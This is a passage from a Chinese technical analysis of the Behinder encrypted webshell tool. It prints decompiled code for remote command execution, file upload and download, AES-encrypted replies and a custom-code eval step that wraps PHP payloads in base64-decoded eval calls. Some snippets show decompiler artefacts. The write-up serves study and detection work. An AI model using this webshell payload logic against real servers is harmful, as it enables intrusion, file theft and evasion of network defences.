            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
CmdUtil显示返回数据
    try {
        int lines = cmdView.getText().split("\n").length;
        String lastLine = cmdView.getText().split("\n")[lines - 1];
        String cmd = lastLine.substring(lastLine.indexOf(pwd) + pwd.length());
        JSONObject resultObj = this.currentShellService.runCmd(cmd);
        if (resultObj.getString("status").equals("success")) {
            cmdView.insert("\n" + resultObj.getString("msg") + "\n");
            cmdView.insert(pwd);
            this.statusLabel.setText("命令执行完成");
            this.currentPos = cmdView.getCaretPosition();
        } else {
            cmdView.insert("\n" + resultObj.getString("msg") + "\n");
            cmdView.insert(pwd);
            this.statusLabel.setText("命令执行失败:" + resultObj.getString("msg"));
        }
        e.doit = false;
    } catch (Exception var10) {
        e.doit = false;
        var10.printStackTrace();
        this.statusLabel.setText(var10.getMessage());
        var10.printStackTrace();
    }
命令执行完成
# 0x06 文件管理 FileOperation
文件管理的过程其实也是和上面getBasicInfo和runCmd的过程类似，整个代码执行的过程在net.rebeyond.behinder.ui.FileManagerUtils，在这个类里面定义了listFile，downloadFile，deleteFile，openFile，showFile，saveFile，uploadFile等常用操作，但是FileManagerUtils只负责界面部分，逻辑部分则调用ShellService的相应方法来实现。
ShellService里面对于文件管理定义了listFiles，deleteFile，showFile，doanloadFile，uploadFile，appendFile等方法，在这些方法里面代码逻辑也是比较相似，调用Utils.getData和Utils.requestAndParse来获取要发送到服务端执行的payload的加密和base64编码的class字节数组，并通过requestAndParse发送和获取返回的执行结果，所以核心部分还是在net.rebeyond.behinder.payload.java.FileOperation类里面。
net.rebeyond.behinder.payload.java.FileOperation执行payload的入口是equals方法，并通过mode这个静态公有变量来判断用户在客户端执行的操作和调用相应的方法，list，show，delete，create，append，doawload等。
    try {
            if (mode.equalsIgnoreCase("list")) {
                ((Map)result).put("msg", this.list(page));
                ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("show")) {
                ((Map)result).put("msg", this.show(page));
                ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("delete")) {
                result = this.delete(page);
            } else if (mode.equalsIgnoreCase("create")) {
                ((Map)result).put("msg", this.create(page));
                ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("createDir")) {
                this.createDir(page);
            } else if (mode.equalsIgnoreCase("append")) {
                ((Map)result).put("msg", this.append(page));
                ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("download")) {
                this.download(page);
                return true;
            }
        } catch (Exception var6) {
            ((Map)result).put("msg", var6.getMessage());
            ((Map)result).put("status", "fail");
        }
list方法，列出指定路径下的文件，判断path是目录还是文件，是目录的那就遍历目录下的文件并获取每个文件的基本信息，包括文件类型，文件名，文件大小，文件读写执行的权限和上次修改的时间，文件的那就直接获取文件的基本信息。
    private String list(PageContext page) throws Exception {
        String result = "";
        File f = new File(path);
        List> objArr = new ArrayList();
        if (f.isDirectory()) {
            File[] var8;
            int var7 = (var8 = f.listFiles()).length;
            for(int var6 = 0; var6  obj = new HashMap();
                obj.put("type", temp.isDirectory() ? "directory" : "file");
                obj.put("name", temp.getName());
                obj.put("size", String.valueOf(temp.length()));
                obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
                obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(temp.lastModified())));
                objArr.add(obj);
            }
        } else {
            Map obj = new HashMap();
            obj.put("type", f.isDirectory() ? "directory" : "file");
            obj.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
            obj.put("size", String.valueOf(f.length()));
            obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(f.lastModified())));
            objArr.add(obj);
        }
        result = this.buildJsonArray(objArr, true);
        return result;
    }
create方法，创建文件，在ShellService里upload方法就是调用create方法来上传文件。这里也比较常规，就是接收要写入的内容并打开输出流，将内容输出到文件，这里要注意接收回来的数据是经过了base64编码，所以要先进行base64解码再输出到文件。
    private String create(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.write((new BASE64Decoder()).decodeBuffer(content));
        fso.flush();
        fso.close();
        result = path + "上传完成，远程文件大小:" + (new File(path)).length();
        return result;
    }
doanload方法，show方法也比较简单，doanload方法打开一个FileInputStream，show打开一个InputStreamReader，然后通过while循环读取文件内容并返回给客户端
    private void download(PageContext page) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        int length = false;
        ServletOutputStream sos = page.getResponse().getOutputStream();
        int length;
        while((length = fis.read(buffer)) > 0) {
            sos.write(Arrays.copyOfRange(buffer, 0, length));
        }
        sos.flush();
        sos.close();
        fis.close();
    }
    private String show(PageContext page) throws Exception {
        if (charset == null) {
            charset = System.getProperty("file.encoding");
        }
        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
            BufferedReader br = new BufferedReader(isr);
            String str = null;
            while((str = br.readLine()) != null) {
                sb.append(str + "\n");
            }
            br.close();
            isr.close();
        }
        return sb.toString();
    }
上面的文件操作方法比较简单也比较常规。完成了以上操作之后，就将执行结果base64编码并转换成json格式，然后用之前连接的时候协商的密匙进行aes加密并将密文返回给客户端。
    try {
        ServletOutputStream so = this.Response.getOutputStream();
        so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
        so.flush();
        so.close();
        page.getOut().clear();
    } catch (Exception var5) {
        var5.printStackTrace();
    }
    return true;
客户端接收到返回的结果之后Shellservice再解密，解析json格式字符串，base64解码并返回到FileManagerUtils，然后FileManagerUtils再在界面上显示出明文信息。至此，FileManagerUtils部分结束。整个逻辑也是比较简单的，常规的。
其实在密匙协商和连接建立之后的getBasicInfo或者runCmd理解了之后，可以发现后面的FileManagerUtil，以及其它的功能比如DBManager，ConnectBack都是类似的逻辑，XXXUtils（DBManagerUtils，ConnectBackUtils）调用ShellService对应的方法，然后调用Utils.getData和Utils.requestAndParse方法获取要发送到服务端执行的payload的加密base64编码的class字节数组并将服务端执行后的返回结果返回给XXXUtils，XXXUtils在再根据结果进行相应处理。但是下面这个eval执行自定义代码却有点不一样，我们一起来看一下。
# 0x07 自定义代码执行 eval
EvalUtils的execute方法调用ShellService的eval方法，eval方法先调用Utils.getClassFromSourceCode将执行的代码转换成为class字节数组，然后就和上面的有一点不同，不调用熟悉的getData，而是调用getEvalData，然后再调用requestAndParse。
    public String eval(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        byte[] payload;
        if (this.currentType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        } else {
            payload = sourceCode.getBytes();
        }
        byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
        Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        return result;
    }
在getEvalData里面，对传进来的class字节数组加密和base64编码，然后再返回给ShellService.eval方法，然后再requestAndParse，所以其实getClassFromSourceCode和getEvalData可以理解成就是一个getData，只是获取payload的class字节数组的方式不同。
    public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
        byte[] result = null;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            encrypedBincls = Crypt.Encrypt(payload, key);
            String basedEncryBincls = Base64.encode(encrypedBincls);
            result = basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
            byte[] encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
            result = Base64.encode(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            Map params = new LinkedHashMap();
            params.put("code", new String(payload));
            result = getData(key, encryptType, "Eval", params, type);
        } else if (type.equals("asp")) {
            encrypedBincls = Crypt.EncryptForAsp(payload, key);
            result = encrypedBincls;
        }
        return result;
    }
    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }
作者在ShellService里面调用的是Utils.getClassFromSource方法然后再调用Run的getClassFromSourceCode方法，而不是调用Utils.getData的方法来获取class字节数组。其实这里细心的话就可以发现，如果是采用前面Utils.getData的方式来获取的话，payload是已经在代码里面写好了，只需要传入参数，而现在的问题就在于payload是由使用者在客户端来编写的，而不是简单的传个参数就可以，所以这里才使用了Run.getClassFromSourceCode这种方式来获取payload的class字节数组而不是采用Utils.getData来获取payload的class字节数组。
net.rebeyond.behinder.utils.jc.Run.getClassFromSourceCode方法
    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
            byte[] classBytes = null;
            Pattern CLASS_PATTERN = Pattern.compile("class\\s+([$_a-zA-Z][$_a-zA-Z0-9]*)\\s*");
            Matcher matcher = CLASS_PATTERN.matcher(sourceCode);
            if (matcher.find()) {
                String cls = matcher.group(1);
                JavaCompiler jc = ToolProvider.getSystemJavaCompiler();
                if (jc == null) {
                    throw new Exception("本地机器上没有找到编译环境，请确认:1.是否安装了JDK环境;2." + System.getProperty("java.home") + File.separator + "lib目录下是否有tools.jar.");
                } else {
                    StandardJavaFileManager standardJavaFileManager = jc.getStandardFileManager((DiagnosticListener)null, (Locale)null, (Charset)null);
                    JavaFileManager fileManager = new CustomClassloaderJavaFileManager(Run.class.getClassLoader(), standardJavaFileManager);
                    JavaFileObject javaFileObject = new MyJavaFileObject(cls, sourceCode);
                    List options = new ArrayList();
                    options.add("-source");
                    options.add("1.6");
                    options.add("-target");
                    options.add("1.6");
                    DiagnosticCollector collector = new DiagnosticCollector();
                    CompilationTask cTask = jc.getTask((Writer)null, fileManager, collector, options, (Iterable)null, Arrays.asList(javaFileObject));
                    boolean result = cTask.call();
                    if (!result) {
                        List> diagnostics = collector.getDiagnostics();
                        Iterator var15 = diagnostics.iterator();
                        if (var15.hasNext()) {
                            Diagnostic diagnostic = (Diagnostic)var15.next();
                            throw new Exception(diagnostic.getMessage((Locale)null));
                        }
                    }
                    JavaFileObject fileObject = (JavaFileObject)CustomClassloaderJavaFileManager.fileObjects.get(cls);
                    if (fileObject != null) {
                        classBytes = ((MyJavaFileObject)fileObject).getCompiledBytes();
                    }
                    return classBytes;
                }
            } else {
                throw new IllegalArgumentException("No such class name in " + sourceCode);
            }
        }
    }
# 0x08 总结
其实理解冰蝎整个编写思路并不难，里面的功能（获取服务器基本信息，执行系统命令，文件管理，数据库管理，反弹meterpreter，执行自定义代码等）大致的过程都比较类似。都是在对应的XXXUtils里面调用ShellService的各个对应方法，然后ShellService里面又调用Utils的getData来获取要执行的payload的加密字节数组，在Utils.requestAndParse里发送加密和base64编码的字节数组和接收返回结果，再将返回结果交给ShellService和XXXUtils进行处理。最核心的部分还是在密匙协商那部分，BasicInfoUtils.getBasicInfo->ShellService构造方法->Utils.getKeyAndCookie，这部分也是waf，ids，ips在检测冰蝎的时候最关注的部分，只要密匙协商和连接成功建立，waf，ids等流量安全设备基本上就面对加密的数据束手无策。大家进行分析的时候，可以由这部分开始进行分析，这部分明朗了之后后面的分析基本上就会水到渠成。
参开链接：  
 利用动态二进制加密实现新型一句话木马之Java篇 冰蝎